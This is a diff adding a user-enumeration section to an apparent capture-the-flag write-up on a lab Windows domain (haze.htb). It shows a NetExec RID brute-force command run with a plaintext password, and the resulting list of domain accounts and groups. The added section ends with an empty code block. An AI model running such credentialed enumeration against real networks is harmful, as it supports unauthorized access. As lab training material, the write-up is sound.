@@ -298,3 +298,48 @@ SMB         10.129.11.223   445    DC01             SYSVOL          READ        
 ```
 No interesting access on shares
 
+## Users
+```python
+nxc smb dc01.haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute 20000
+SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.223   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.129.11.223   445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             500: HAZE\Administrator (SidTypeUser)
+SMB         10.129.11.223   445    DC01             501: HAZE\Guest (SidTypeUser)
+SMB         10.129.11.223   445    DC01             502: HAZE\krbtgt (SidTypeUser)
+SMB         10.129.11.223   445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             513: HAZE\Domain Users (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             525: HAZE\Protected Users (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             526: HAZE\Key Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             1000: HAZE\DC01$ (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1104: HAZE\mark.adams (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1106: HAZE\alexander.green (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1112: HAZE\Support_Services (SidTypeGroup)
+```
+I can adapt this command to write all the users from this output to a userfile
+
+```python
+
+```
